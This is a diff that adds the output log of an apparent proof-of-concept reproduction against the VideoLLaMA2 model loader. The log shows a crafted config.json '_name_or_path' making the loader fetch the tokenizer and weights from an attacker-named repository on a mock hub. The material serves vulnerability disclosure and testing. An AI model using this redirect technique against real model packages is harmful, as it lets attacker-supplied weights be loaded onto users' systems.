@@ -1,0 +1,22 @@
+[victim] package            : E:\Reproduce\DAMO-NLP-SG-VideoLLaMA2_directed-model-load_2026-10-06\poc\work\pkg_attacker
+[victim] config.model_type  : videollama2_mistral
+[victim] config.tune_mm_mlp_adapter : True
+[victim] config._name_or_path = 'attacker/videollama2-base'
+[victim] PretrainedConfig.from_pretrained(pkg)._name_or_path -> 'attacker/videollama2-base'
+[victim]           (the JSON value survives: this is what line 144 reuses)
+[victim] AutoConfig.from_pretrained(pkg)._name_or_path       -> 'E:\\Reproduce\\DAMO-NLP-SG-VideoLLaMA2_directed-model-load_2026-10-06\\poc\\work\\pkg_attacker'
+[victim]           (AutoConfig would have rewritten it to the local path)
+[victim] calling videollama2.model_init(E:\Reproduce\DAMO-NLP-SG-VideoLLaMA2_directed-model-load_2026-10-06\poc\work\pkg_attacker)
+Loading VideoLLaMA 2 from base model...
+[victim] load : model_init raised AttributeError: 'NoneType' object has no attribute 'image_processor'
+[victim]         last frame: __init__.py:186 (in the pinned loader)
+------------------------------------------------------------------------
+[victim] repositories contacted (from mock-hub request log):
+[victim]   GET  attacker/videollama2-base/resolve/main/generation_config.json
+[victim]   GET  attacker/videollama2-base/resolve/main/model.safetensors
+[victim]   GET  attacker/videollama2-base/resolve/main/special_tokens_map.json
+[victim]   GET  attacker/videollama2-base/resolve/main/tokenizer.json
+[victim]   GET  attacker/videollama2-base/resolve/main/tokenizer_config.json
+------------------------------------------------------------------------
+[victim] RESULT: REPO REDIRECT CONFIRMED - tokenizer and weights were fetched
+[victim]         from the repository named in config.json `_name_or_path`
